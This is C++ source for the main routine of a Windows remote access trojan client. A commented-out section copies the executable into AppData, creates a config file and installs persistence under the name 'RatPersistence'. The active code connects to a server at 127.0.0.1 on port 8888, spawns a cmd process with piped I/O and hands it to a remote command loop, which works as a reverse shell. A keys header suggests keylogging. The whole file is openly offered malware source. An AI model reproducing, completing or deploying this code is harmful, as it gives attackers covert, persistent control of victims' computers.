#include <iostream>
#include <string>
#include <filesystem>
#include "include/socketconnection.h"
#include "include/persist.h"
#include "include/keys.h"

int main() {
/*     std::filesystem::path appdata_path = getAppDataPath();

    if (appdata_path.empty()) {
        //std::cerr << "Could not find appdata variable. exiting..\n";
        return 1;
    }

    std::filesystem::path conf_path =  appdata_path / "RAT" / "rat_client.conf";
    std::filesystem::path malware_path = appdata_path / "RAT" / "rat_client.exe";


    // ---------- MALWARE FILE ----------
    if (!fileExist(malware_path)) {
        std::filesystem::path current_exe_path = getExecutablePath();

        if (current_exe_path.empty()) {
            //std::cerr << "Could not find executable path.\n";
            return 1;
        }


        if (copyExe(current_exe_path, malware_path.parent_path())) {
            //std::cout << "rat_client.exe copied to AppData" << std::endl;
        } else {
            //std::cout << "Could not copy rat_client.exe to AppData." << std::endl;
            return 1;
        }

    } else {
        //std::cout << "rat_client.exe already exists in AppData." << std::endl;
    }


    // ---------- CONFIGURATION FILE ----------
    if (!fileExist(conf_path)) {
        if (createConfigFile(conf_path)) {
            //std::cout << "rat_client.conf created in AppData." << std::endl;
        } else {
            //std::cout << "Could not create rat_client.conf configuration file in AppData" << std::endl;
            return 1;
        }
    } else {
        //std::cout << "rat_client.conf configuration file already exists in AppData" << std::endl;
    }


    // ---------- PERSISTENCE ----------
    std::wstring processName = L"RatPersistence";
    if (!checkPersistence(processName)) {
        if (persistence(processName, malware_path)) {
            //std::cout << "Persistence created." << std::endl;
        } else {
            //std::cout << "Could not create persistence." << std::endl;
            return 1;
        }

    } else {
        //std::cout << "Persistence already exists." << std::endl;
    } */


    // ---------- CONNECTION ----------
    const std::string ip = "127.0.0.1";
    const int port = 8888;

    if (!initWinsock()) return 1;
    SOCKET s = connectToServer(ip, port);
    if (s == INVALID_SOCKET) return 1;




    HANDLE hReadOut, hWriteOut, hReadIn, hWriteIn;
    PROCESS_INFORMATION pi;

    if (!launchCmdProcess(hReadOut, hWriteOut, hReadIn, hWriteIn, pi)) {
        closesocket(s);
        WSACleanup();
        return 1;
    }

    commandLoop(s, hReadOut, hWriteIn, ip, port);
    cleanup(s, hReadOut, hWriteIn, pi);
    return 0;
}